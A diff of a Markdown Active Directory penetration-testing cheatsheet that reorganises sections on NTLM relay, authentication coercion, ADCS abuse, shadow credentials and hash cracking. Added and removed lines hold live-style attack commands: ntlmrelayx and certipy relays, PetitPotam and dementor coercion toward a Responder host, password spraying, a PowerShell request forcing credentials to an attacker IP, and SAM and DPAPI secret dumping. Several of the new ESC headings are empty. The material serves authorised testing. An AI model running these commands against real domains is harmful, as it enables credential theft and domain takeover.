@@ -44,26 +44,22 @@
     - [Identifying Quick Wins](#identifying-quick-wins)
     - [adPeas](#adpeas)
     - [Password spray](#password-spray)
-    - [Force Authentication](#force-authentication)
-      - [LNK Files](#lnk-files)
+    - [LNK Files](#lnk-files)
     - [Potatoes Attacks](#potatoes-attacks)
       - [Ghost potato](#ghost-potato)
       - [Remote Potato](#remote-potato)
       - [Juicy Potato](#juicy-potato)
+      - [Juicy Potato NG](#juicy-potato-ng)
       - [Hot Potato](#hot-potato)
       - [Sweet Potato](#sweet-potato)
-      - [God Potato](#god-potato)
     - [RPC Misc](#rpc-misc)
         - [AD user password modification using rpcclient](#ad-user-password-modification-using-rpcclient)
         - [RPC password spraying](#rpc-password-spraying)
     - [Kerberoasting](#kerberoasting)
-    - [Kerberos Delegation](#kerberos-delegation)
     - [Kerberos Bronze Bit](#kerberos-bronze-bit)
     - [Abusing Vulnerable GPO](#abusing-vulnerable-gpo)
     - [Abusing MS-SQL Service](#abusing-ms-sql-service)
     - [Relay attacks](#relay-attacks)
-      - [NetNTLMv1 Downgrade attack](#netntlmv1-downgrade-attack)
-      - [Stealing NetNTLM hashes via outlook signatures](#stealing-netntlm-hashes-via-outlook-signatures)
     - [Drop the MIC CVE-2019-1040](#drop-the-mic-cve-2019-1040)
     - [Exploiting ACL over GPO](#exploiting-acl-over-gpo)
     - [Insecure LDAP: LDAPS / Signing / Channel Binding](#insecure-ldap-ldaps--signing--channel-binding)
@@ -72,6 +68,8 @@
       - [LDAP Channel Binding](#ldap-channel-binding)
     - [Unencrypted Protocols in use](#unencrypted-protocols-in-use)
       - [SMTP](#smtp)
+      - [IMAP](#imap)
+      - [POP3](#pop3)
       - [HTTP](#http)
       - [Telnet](#telnet)
       - [FTP](#ftp)
@@ -90,6 +88,7 @@
         - [BloodyAD - AutoBloody](#bloodyad---autobloody)
         - [DACL Edit python script](#dacl-edit-python-script)
         - [ForceChangePassword](#forcechangepassword)
+        - [Shadow credentials](#shadow-credentials)
     - [MachineAccountQuota (MAQ)](#machineaccountquota-maq)
     - [Protected Users](#protected-users)
     - [PAC](#pac)
@@ -98,11 +97,12 @@
     - [ProxyNotShell](#proxynotshell)
     - [ZeroLogon](#zerologon)
     - [PrintNightmare](#printnightmare)
-      - [SpoolSample](#spoolsample)
+    - [Petitpotam](#petitpotam)
+      - [Coercer](#coercer)
       - [ShadowCoerce](#shadowcoerce)
       - [DFSCoerce](#dfscoerce)
-      - [MultiCoerce](#multicoerce)
-    - [Petitpotam](#petitpotam)
+      - [SpoolSample](#spoolsample)
+      - [Dementor](#dementor)
     - [samAccountName spoofing](#samaccountname-spoofing)
     - [MiTM - IPv6 + Relay](#mitm---ipv6--relay)
     - [Responder + Relay](#responder--relay)
@@ -117,16 +117,29 @@
     - [MS14-066](#ms14-066)
   - [Active Directory exploitation](#active-directory-exploitation)
     - [ZeroLogon](#zerologon-1)
-    - [Shadow Credential](#shadow-credential)
-    - [ShadowSpray](#shadowspray)
     - [Exploiting ADCS](#exploiting-adcs)
-    - [ADCS WebDav + NTLM relay to LDAP](#adcs-webdav--ntlm-relay-to-ldap)
-    - [Adidns](#adidns)
+      - [ESC1 -](#esc1--)
+      - [ESC2 -](#esc2--)
+      - [ESC3 -](#esc3--)
+      - [ESC4 -](#esc4--)
+      - [ESC5](#esc5)
+      - [ESC6](#esc6)
+      - [ESC7](#esc7)
+      - [ESC8](#esc8)
+      - [ESC9](#esc9)
+      - [ESC10](#esc10)
+      - [ESC11](#esc11)
+      - [ESC12](#esc12)
+      - [ESC13](#esc13)
+      - [ESC14](#esc14)
+      - [Pass the certificate](#pass-the-certificate)
+      - [CertPotato](#certpotato)
+    - [to HTTP + NTLM relay to LDAP](#to-http--ntlm-relay-to-ldap)
     - [Exploiting machine accounts (WS01$)](#exploiting-machine-accounts-ws01)
     - [Over-Pass-The-hash](#over-pass-the-hash)
     - [Pass The ticket](#pass-the-ticket)
     - [Silver ticket](#silver-ticket)
-    - [Kerberos Delegation](#kerberos-delegation-1)
+    - [Kerberos Delegation](#kerberos-delegation)
       - [Exploiting RBCD : MachineAccountQuota](#exploiting-rbcd--machineaccountquota)
       - [Exploiting RBCD : WRITE Priv](#exploiting-rbcd--write-priv)
     - [From On-Premise to Azure](#from-on-premise-to-azure)
@@ -144,7 +157,6 @@
   - [comexec](#comexec)
       - [Detection](#detection-4)
   - [Persistence](#persistence)
-    - [AdminSDHolder](#adminsdholder)
     - [Primary Group ID](#primary-group-id)
     - [Dropping SPN on admin accounts](#dropping-spn-on-admin-accounts)
       - [Persistence in AD environment](#persistence-in-ad-environment)
@@ -158,9 +170,6 @@
     - [Active Directory NTDS : Clear Text passwords (Reversible encryption)](#active-directory-ntds--clear-text-passwords-reversible-encryption)
     - [DCSYNC](#dcsync)
     - [Accessing LSASS secrets](#accessing-lsass-secrets)
-      - [LSASS](#lsass)
-      - [Registry Secrets](#registry-secrets)
-      - [DPAPI](#dpapi)
         - [Lsassy](#lsassy)
     - [Bring Your Own Domain Controller](#bring-your-own-domain-controller)
   - [Misc : AD Audit](#misc--ad-audit)
@@ -176,6 +185,7 @@
       - [AdminCount on regular users](#admincount-on-regular-users)
   - [Data-Exfiltration](#data-exfiltration)
   - [Cracking Hashes](#cracking-hashes)
+      - [Extracting hash (john format) from password protected file like Word, Excel, 7z, SSH, truecrypt](#extracting-hash-john-format-from-password-protected-file-like-word-excel-7z-ssh-truecrypt)
       - [LM hash](#lm-hash)
       - [NTLM hash](#ntlm-hash)
       - [Net-NTLMv1](#net-ntlmv1)
@@ -206,12 +216,14 @@
       - [PetitPotam and ADCS](#petitpotam-and-adcs)
       - [Active Directory Exploitation cheatsheet](#active-directory-exploitation-cheatsheet)
       - [Attacking Active Directory](#attacking-active-directory)
-      - [Kerberos Delegation](#kerberos-delegation-2)
+      - [Kerberos Delegation](#kerberos-delegation-1)
       - [Exceptional blog posts regarding Windows Authentication/Credentials/RDP](#exceptional-blog-posts-regarding-windows-authenticationcredentialsrdp)
       - [Windows Logon Types](#windows-logon-types)
       - [Windows Name Pipes](#windows-name-pipes)
       - [COM / DCOM](#com--dcom)
       - [PowerShell Without PowerShell](#powershell-without-powershell)
+      - [To do](#to-do)
+
 
 ## Recon
 
@@ -357,9 +369,9 @@ python3 CVE-2022-33679.py evilcorp.local/vulnasrepuser dc-2016.evilcorp.local -d
 export KRB5CCNAME=vulnasrepuser_dc-2016.evilcorp.local.ccache 
 crackmapexec smb dc-2016.evilcorp.local -k
 ```
-<img src="./images/asprepwithoutcrack1.png" width="500"/>
+<img src="../images/asprepwithoutcrack1.png" width="500"/>
 
-<img src="./images/asprepwithoutcrack2.png" width="500"/>
+<img src="../images/asprepwithoutcrack2.png" width="500"/>
 
 ## Authenticated enumeration
 
@@ -567,16 +579,16 @@ Spraying 3 password attempt for each user every 15 minutes without attempting pa
 ```
 spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 corp.company.local NOUSERUSER
 ```
+- https://github.com/absolomb/smbspray
 
+Spraying 3 password attempts for each user every 15 minutes, attempting password=username and light variations.
+Stops after 3 or 4 accounts locked out.
+```
+python smbspray.py -u users.txt  -p passwords.txt  -d corp.company.local -l 15 -a 3 -ip DC_IP --user_pw
+```
 - https://github.com/ShutdownRepo/smartbrute
 
-### Force Authentication
-- https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
-- https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/
-
-.SCF, .URL, .RTF, .XML, 
-  
-#### LNK Files
+### LNK Files
 If you get access to a share we can create a malicious .LNK file. This .LNK file will includes a refernece to the attacker computers.
 You can after choose to Relay the *NetNTLM* hash or crack it.
 
@@ -600,25 +612,25 @@ $lnk.Save()
 
 ### Potatoes Attacks
 #### Ghost potato
-https://shenaniganslabs.io/files/impacket-ghostpotato.zip
+https://shenaniganslabs.io/files/impacket-ghostpotato.zip (Security patch in 2019 CVE-2019-1384)
 
 #### Remote Potato
-https://github.com/antonioCoco/RemotePotato0/
+https://github.com/antonioCoco/RemotePotato0/ (October 2022 patched)
 
 #### Juicy Potato
-https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
+https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505 (Patched in Windows 10 1809)
+
+#### Juicy Potato NG
+https://github.com/antonioCoco/JuicyPotatoNG
 
 #### Hot Potato
-https://pentestlab.blog/2017/04/13/hot-potato/
+https://pentestlab.blog/2017/04/13/hot-potato/ (2016 patch, ex MS16-075)
 
 #### Sweet Potato
 https://www.pentestpartners.com/security-blog/sweetpotato-service-to-system/
 
 
 https://www.ctfnote.com/red-teaming/privilege-escalation/windows-privilege-escalation/token-impersonation-and-potato-attacks
-
-#### God Potato
-https://github.com/BeichenDream/GodPotato
 
 ### RPC Misc
 ##### AD user password modification using rpcclient  
@@ -657,9 +669,6 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 --> To protect against this attack, we must avoid having *SPN* on user accounts, in favor of machine accounts.  
 --> If it is necessary, we should use Microsoft’s Managed Service Accounts (MSA) feature, ensuring that the account password is robust and changed regularly and automatically
 
-### Kerberos Delegation
-- https://www.youtube.com/watch?v=7_iv_eaAFyQ
-
 ### Kerberos Bronze Bit
 https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-overview/
 https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/
@@ -683,15 +692,7 @@ Import-Module .\powercat.ps1 powercat -l -v -p 443 -t 10000
 ```
 
 ### Relay attacks
-<img src="./images/smb_relay.png" width="700"/>
-
-#### NetNTLMv1 Downgrade attack
-- https://www.r-tec.net/r-tec-blog-netntlmv1-downgrade-to-compromise.html
-
-#### Stealing NetNTLM hashes via outlook signatures
-- https://research.nccgroup.com/2021/01/15/sign-over-your-hashes-stealing-netntlm-hashes-via-outlook-signatures/
-- https://github.com/nccgroup/nccfsas/tree/main/Tools/Sigwhatever
-
+<img src="../images/smb_relay.png" width="700"/>
 
 ### Drop the MIC CVE-2019-1040
 - https://securityboulevard.com/2019/06/drop-the-mic-cve-2019-1040/
@@ -724,7 +725,6 @@ The LDAP relay attack will give you the ability to perform multiple action such 
 
 - Dumping LDAP information (ActiveDirectory users/groups/computers information)
 - In case the relayed session is from a *Domain Admins* user you will be able to directly persiste and create a new *Domain Admins* user.
-- 
 
 Validate LDAP signing is not enforced
 ```
@@ -737,11 +737,26 @@ Channel binding is the act of binding the transport layer and application layer 
 ```
 python3 LdapRelayScan.py -dc-ip 192.168.0.10 -u jdoe -p Password123
 ```
+Bypassing with StartTLS to add a computer for example, using a recent version of ntlmrelayx tool 
+
+```
+ntlmrelayx.py -t ldap://172.20.15.209 --no-da --no-acl --no-validate-privs --add-computer 'OFFSECATTACK$' -smb2support --http-port 8080
+```
 
 ### Unencrypted Protocols in use
 
+```
+sudo nmap -p 389,21,20,80,25,110,143,23 192.169.0.1/24 --open -oN unencrypted_protocols_in_use
+```
+
 #### SMTP
 Port 25
+
+#### IMAP
+Port 143
+
+#### POP3
+Port 110
 
 #### HTTP
 Port 80
@@ -826,6 +841,13 @@ Relay over smb to 192.168.0.10, with smb2 support, socks enable, interactive mod
 sudo ntlmrelayx.py -t 192.168.0.10 -i -socks -smb2support -debug --output-file ./netntlm.hashes.relay
 ```
 
+- Relay to Exchange (patched since February 2019)
+
+https://github.com/dirkjanm/privexchange/
+
+- Relay to SCCM
+
+https://github.com/fortra/impacket/pull/1425
 
 ### WPAD
 Many browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network, download the wpad.dat, Proxy Auto-Config (PAC) file.
@@ -858,8 +880,9 @@ Serve-Html = On
 - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
 - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#forcechangepassword
 - https://github.com/ShutdownRepo/The-Hacker-Recipes/tree/master/ad/movement/dacl
+- https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
 
-<img src="./images/DACLabuse-dark.png" width="800"/>
+<img src="../images/DACLabuse-dark.png" width="800"/>
 
 ##### BloodyAD - AutoBloody
 - https://github.com/CravateRouge/bloodyAD
@@ -889,7 +912,19 @@ Using *rpcclient*
 rpcclient -U jdoe 10.10.10.192
 setuserinfo2 victimUser 23 'Pass123!'
 ```
+##### Shadow credentials
+(Domain level Windows Server 2016) Bypass rights restrictions on common atributes (ex: RBCD attack) of user and computer accounts 
 
+- NTLM relay:
+  ```
+  ntlmrelayx.py -t ldap://adhost.domain.com --shadow-credentials --shadow-target WIN-SCCM$ --cert-outfile-path win-sccm_creds --no-dump -no-da --no-acl --no-validate-privs
+  ```
+https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials
+
+- User account:
+  - https://github.com/eladshamir/Whisker
+  - https://github.com/ShutdownRepo/pywhisker
+  
 ### MachineAccountQuota (MAQ)
 - https://www.netspi.com/blog/technical/network-penetration-testing/machineaccountquota-is-useful-sometimes/
 - https://github.com/Kevin-Robertson/Powermad
@@ -918,7 +953,7 @@ Various tools exist which can create a machine account from the command line or 
 - The samAccountName can be changed to anything that doesn’t match a samAccountName already present in a domain.
 --> Interestingly, the samAccountName can even end in a space which permits mimicking any existing domain account. You can strip the $ character also.
 
-<img src="./images/MAQSAMAccoutnName.png" width="700"/>
+<img src="../images/MAQSAMAccoutnName.png" width="700"/>
 
 ### Protected Users
 Well-known SID/RID: ```S-1-5-21-<domain>-525```
@@ -941,8 +976,6 @@ for group in $(rpcclient -U '' -N 10.10.0.10 -c enumdomgroups | grep Protected |
 - Members of this group cannot use NTLM
 - Kerberos ticket-granting tickets (TGTs) lifetime = 4 hours
 
---> Restriction of the [Protected Users group is not complete](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/) when it comes to the RID500 user of the Active Directory domain. We cannot connect using the NTLM authentication protocol but we can connect using the Kerberos authentication protocol with RC4.
-
 ### PAC
 Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
 
@@ -958,19 +991,8 @@ Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonat
 crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M zerologon
 ```
 
-### PrintNightmare
-
-#### SpoolSample
-https://github.com/leechristensen/SpoolSample
-
-#### ShadowCoerce
-https://github.com/ShutdownRepo/ShadowCoerce
-
-#### DFSCoerce
-https://github.com/Wh04m1001/DFSCoerce
-
-#### MultiCoerce
-
+### PrintNightmare 
+https://github.com/outflanknl/PrintNightmare  (MS-PAR method)
 
 ### Petitpotam
 PetitPotam, publicly disclosed by French security researcher Lionel Gilles, is comparable to the PrintSpooler bug but utilizes the **MS-EFSRPC** API to coerce authentication rather than **MS-RPRN**.
@@ -979,6 +1001,22 @@ Check to validate host is vulnerable to petitpotam
 ```
 crackmapexec smb 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M petitpotam
 ```
+https://github.com/topotam/PetitPotam
+
+#### Coercer
+https://github.com/p0dalirius/Coercer (several methods)
+#### ShadowCoerce
+https://github.com/ShutdownRepo/ShadowCoerce (MS-FSRVP method)
+
+#### DFSCoerce 
+https://github.com/Wh04m1001/DFSCoerce  (MS-DFSNM method)
+
+#### SpoolSample
+https://github.com/leechristensen/SpoolSample  (MS-RPRN RPC method)
+
+#### Dementor
+https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc (improved implementation of SpoolSample)
+
 ### samAccountName spoofing
 
 ### MiTM - IPv6 + Relay
@@ -1032,10 +1070,10 @@ WSUS or Windows Software Update Services is the enterprise variant of Windows up
 - Updates must be approved by administrator before being pushed out
 
 **wsus soap service**  
-<img src="./images/wsus_soap_service.png" width="500"/>
+<img src="../images/wsus_soap_service.png" width="500"/>
 
 **MITM wsus soap service**
-<img src="./images/wsus_psexec.png" width="500"/>
+<img src="../images/wsus_psexec.png" width="500"/>
 
 Check WSUS HTTP Misconfiguration:
 - Check Registry on WSUS client machines to validate TLS usage
@@ -1081,7 +1119,7 @@ On domain controller (up to Windows Server 2019) if you create a computer accoun
 
 --> This will set the computer account password to default password that matches the first 14 characters of their computer name, lowercase and without a dollar sign.
 
-<img src="./images/timeroasting.png" width="700"/>
+<img src="../images/timeroasting.png" width="700"/>
 
 ```
 python3 timeroast.py 192.168.2.60 -o ntp_hashes
@@ -1119,50 +1157,125 @@ hashcat -a 0 -m 3130 ntp_hashes ./wordlists/rockyou.txt
 
 ### ZeroLogon
 
-### Shadow Credential
-If an attacker can write to the **msDS-KeyCredentialLink** property of a user/computer, it is possible to retrieve the NT hash of that object.  
-
-- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials
-- https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
-- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
-- https://pentestlab.blog/2022/02/07/shadow-credentials/
-
-### ShadowSpray
-- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials#shadowspray
-
 ### Exploiting ADCS
 Find PKI Enrollment Services in Active Directory and Certificate Templates Names
 ```
 crackmapexec ldap 10.10.0.10 -u jdoe -p Pass1234 -d company.com -M adcs
 certutil.exe -config - -ping
 ```
+Enumerate misconfigured templates
+- Grey box
+  - https://github.com/ly4k/Certipy
+  - After enumeration, check the TXT output  for a quick analysis
 
+- Black box
+```
+ntlmrelayx.py -t ldap://server.corp.ca --dump-adcs
+```
+Abusing with NTLM relay to AD CS HTTP endpoint
+
+- Obtain base64 certificate from User authentication template
+```
+ ntlmrelayx.py -6 -t http://CA_server/certsrv/certfnsh.asp -smb2support --adcs --template "User" -debug 
+```
+- Obtain PFX certificate. If relaying from Domain Controller, use ```-template``` switch
+```
+certipy relay -target 'http://CA.domain.com'  -template DomainController
+```
 - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
 - https://github.com/PKISolutions/PSPKI
 - https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/
 
 #### ESC1 - 
 
-- msPKI-enrollment-flag	: Whether CA manager approval is required
-- Authorized signatures : required	How many authorized signatures are required to sign this certificate
-- PKI-extended-key-usage : What the certificate can be used for (for example, code signing and client authentication)
-- msPKI-certificate-name-flag	: Whether the certificate be requested on behalf of another party
-- Enrollment permissions : Who can request a certificate with this template
+#### ESC2 - 
 
+#### ESC3 - 
 
-### ADCS WebDav + NTLM relay to LDAP
+#### ESC4 - 
+
+#### ESC5
+
+#### ESC6
+
+#### ESC7
+
+#### ESC8
+
+#### ESC9
+
+#### ESC10
+
+#### ESC11
+
+#### ESC12
+
+#### ESC13
+
+#### ESC14
+
+  #### Pass the certificate
+- Swiss knife for certificates, using a PFX file
+  - https://github.com/ly4k/Certipy
+- Request a TGT using a PFX,PEM file or base64 encoded blob:
+  - https://github.com/dirkjanm/PKINITtools/tree/master
+- Feature for DCSYNC rights delegation
+  - https://github.com/AlmondOffSec/PassTheCert/tree/main
+
+  #### CertPotato
+- https://sensepost.com/blog/2022/certpotato-using-adcs-to-privesc-from-virtual-and-network-service-accounts-to-local-system/
+
+  Local Privilege escalation through TGT
+  
+  Requirements:
+    - RCE or shell on a machine
+    - Rubeus tool uploaded on the machine
+    - Execute commands as service/virtual account
+    - Macthine template is enabled in AD CS environment
+  ```
+  Rubeus.exe tgtdeleg /nowrap
+  ```
+
+###  to HTTP + NTLM relay to LDAP
+- https://www.hackingarticles.in/lateral-movement-webclient-workstation-takeover/
+  
+Common NTLM relay attacks to perform RBCD use the basic HTTP to LDAP flow.
+
+Coercing computer NTLM authentication and relaying to LDAP involves the SMB to LDAP flow that does not work. The solution is to coerce NTLM authenticaton over HTP (ex: service  Webdav) and relay it to LDAP(S) server.
+
+Coercing to Webdav, with credentials:
+
+ Check if Webdav is enabled on the target:
+ ```
+ cme smb 192.168.10.12 -u snovvcrash -p 'Passw0rd!' -d megacorp.local -M webdav
+ ```
+ Webdav is running under service "WebClient" and is not installed by default on Windows Server. If you cannot enable it and you have write permissions on a SMB share of the target:
+ ```
+ cme smb 192.168.10.12 -u snovvcrash -p 'Passw0rd!' -d megacorp.local -M drop-sc
+ ```
+Add DNS entry for Responder:
+  ```
+ python dnstool.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' --record 'Responder' --action add --data @IP_Responder @IP_LDAP_server
+ ```
+Trigger coercion to Webdav
+  ```
+ python dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' Responder@80/test.txt Target.megacorp.local
+ ```
+ ```
+ python3 PetitPotam.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' Responder@80/test Target.megacorp.local
+ ```
+- https://mayfly277.github.io/posts/GOADv2-pwning-part13/
 - https://twitter.com/tifkin_/status/1418855927575302144/photo/1
-- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate#rbcd-remote-computer-takeover
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate
 
-### Adidns
->  The Domain Services ACL can be hardened to prevent domain users from creating arbitrary records. This can be done by changing the security configuration for your DNS zones. On the server on which the service Domain Service is running, open the DNS Manager, and for each domain zone under which users are joined, remove the “Create all child objects” permission from the “Authenticated Users” group.
+Coercing to HTTP without Webdav service
 
-- https://www.gosecure.net/blog/2019/02/20/abusing-unsafe-defaults-in-active-directory/
-- https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/
-- https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/
-- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/adidns-abuse
-- 
-
+If you have a Webshell or can execute OS command (ex: OS command injection, xp_cmdshell) on the target, run the following command:
+ ```
+ powershell iwr http://IP_address_Responder -UseDefaultCredentials
+ ```
+- https://nitter.1d4.us/pic/orig/enc/bWVkaWEvR0RtRWcyOVgwQUF6SVpxLmpwZw==
+  
 ### Exploiting machine accounts (WS01$)
 - https://pentestlab.blog/2022/02/01/machine-accounts/
 - https://secarma.com/using-machine-account-passwords-during-an-engagement/
@@ -1292,8 +1405,6 @@ smbclient //192.168.0.10/C$ -U corp.company.com/jdoe --pw-nt-hash <NT hash>
 
 ## Persistence
 
-### AdminSDHolder
-
 ### Primary Group ID
 
 The *primary group id* is a a user object attribute and contains *relative identifier* (RID) for the primary group of the user.  
@@ -1407,6 +1518,7 @@ $VerbosePreference = "Continue"
 1. Compromise an account with admin rights to admin server.
 2. Admin server computer account needs rights to Domain Controllers.
 
+
 ### Extract NTDS
 #### Extract NTDS without Admin priv
 - https://www.youtube.com/watch?v=KWLA_OLanPc
@@ -1442,144 +1554,14 @@ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 
 ### DCSYNC
 
+
+
 - [Primer on DCSync attack](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)
 - [ADSecurity - Mimikatz DCSync Usage, Exploitation, and Detection](https://adsecurity.org/?p=1729)
 - [Ired Team - Dump Password From DC with DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [Synacktiv - Dive Into MDI - DCsync detection bypass](https://www.synacktiv.com/publications/a-dive-into-microsoft-defender-for-identity.html)
 
 ### Accessing LSASS secrets
-[Windows Secrets Extraction - Summary](https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary.html)
-- Secrets in LSASS process.
-- Secrets in registry such as LSA secrets.
-- DPAPI secrets.
-
-#### LSASS
-**Secrets retrieved From LSASS**
-- User / Machine$ (computer account) Hashes
-- Cleartest credentials (If Wdigest enabled)
-- Kerberos ticket (TGT and ST)
-- DPAPI cached keys
-
-**Protection**
-- RunAsPPL
-- Credential Guards
-
-**UserLand**
-- Lsassy --> Pypykatz
-- Nanodump
-
-**KernelLand**
-- https://www.loldrivers.io/
-- [Physmem2profit](https://github.com/WithSecureLabs/physmem2profit)
-- [EdrSandBlast](https://github.com/wavestone-cdt/EDRSandblast)
-- DumpIt
-  
-#### Registry Secrets
-**Secrets retrieved From registry**
-- SAM secrets (security Account Manager)
-- LSA secrets (Local Security Authority)
-  - DPAPI_SYSTEM
-  - NL$KM
-  - MsCache
-  - $MACHINE.ACC
-  - DEFAUTLPASSWORD
-- Software Secrets (ASP.NET, ...)
-
-```
-> reg save HKLM\SAM sam
-OR
-> vssadmin create shadow /for=C:
-> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM SAM
-OR
-$ secretsdump.py -sam sam -security security -system system local
-```
-
-[SharpSecretsDump](https://github.com/laxa/SharpSecretsdump) : C# project used to mimic secretsdump.py from Impacket
-
-#### DPAPI
-- https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107
-- https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
-- https://www.passcape.com/index.php?section=docsys&cmd=details&id=28
-- https://www.insecurity.be/blog/2020/12/24/dpapi-in-depth-with-tooling-standalone-dpapi/
-- https://github.com/jordanbtucker/dpapick
-- https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary.html
-- https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9
-- https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
-- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
-- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20DPAPI.md
-- https://github.com/Processus-Thief/HEKATOMB
-- https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/
-- https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz
-- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++
-- https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb
-- https://pentestlab.blog/tag/dpapi/
-- https://blog.sygnia.co/the-downfall-of-dpapis-top-secret-weapons
-- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/credential-harvesting/dpapi
-- https://www.youtube.com/watch?v=WSJjIsElJ3U
-  
-DPAPI - Data Protectgion API. When a software offers a "remember me" or "save credentials" feature, DPAPI is probably used to encrypt credentials before storing them. (Part of Crypt32.dll)  
-
-DPAPI use **2** main functions: [CryptUnprotectDat](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata) and [CryptProtectData](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata).  
-
-DPAPI encryption mechanism relies on masterkeys (MK), used to encrypt the data. The Masterkeys are encrypted with a derivative from the user's password or the DPAPI system key.
-
-User masterkeys are located here:
-```
-C:\Users\<user>\AppData\Roaming\Protect\Microsoft\<SID>
-```
-
-Machine masterkeys are located here:
-```
-C:\Windows\System32\Microsoft\Protect\S-1-5-18\User
-C:\Windows\System32\Microsoft\Protect\S-1-5-18
-```
-
-Different types of secrets are encrypted using DPAPI:
-- Credentials
-```
-For User:
-PS C:\Users\lutzenfried> Get-ChildItem -Hidden C:\Users\lutzenfried\AppData\Local\Microsoft\Credentials\
-
-
-    Directory: C:\Users\lutzenfried\AppData\Local\Microsoft\Credentials
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a-hs-        2023-04-23   9:41 PM           4368 B81681331F8F01AA4D35198BE3BF510B
--a-hs-        2023-03-01  11:01 AM          11104 DFBE70A7E5CC19A398EBF1B96859CE5D
--a-hs-        2023-03-02  10:34 AM           1264 E05DBE15D38053457F3523A375594044
-
-For Systems:
-Get-ChildItem -Hidden C:/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials/
-```
-- Vault
-- DPAPI blob
-Wi-Fi credentials are stored as DPAPI blobs inside the following files:
-```
-Location: C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\*.xml
-
-> netsh wlan show profile
-
-> netsh wlan show profile SSID key=clear
-```
-- RSA / NGC
-
---> As Domain Admin, you can extract the backup key that lets you decrypt any users' secrets.  
-Using Mimikatz
-```
-lsadump::backupkeys /system:dc01.offense.local /export
-```
-
-Using SharpDPAPI
-```
-SharpDPAPI.exe backupkey /nowrap
-```
-
-You will potentially sometimes be able to identify binary blob encrypted using DPAPI based on 62 bytes:
-```
-01 00 00 00 d0 8c 9d df  01 15 d1 11 8c 7a 00 c0 4f c2 97 eb 01 00 00 00  d2 87 4b 1d ab ce 3d 43 a7 c8 43 4d bf ca ee fa  00 00 00 00 02 00 00 00 00 00 10 66 00 00 00 01  00 00 20 00 00 00
-```
 
 ##### Lsassy
 - https://github.com/Hackndo/lsassy
@@ -1745,63 +1727,33 @@ Data exfiltration and DLP (Data Loss Prevention) bypass.
 
 ## Cracking Hashes
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md
-  
+
+#### Extracting hash (john format) from password protected file like Word, Excel, 7z, SSH, truecrypt
+- https://github.com/openwall/john/tree/bleeding-jumbo/run
+```
+ssh2john.py id_rsa > ssh-hash.txt
+john ssh-hash.txt --wordlist=/usr/share/wordlists/rockyou_2021.txt
+```
 #### LM hash
 ```
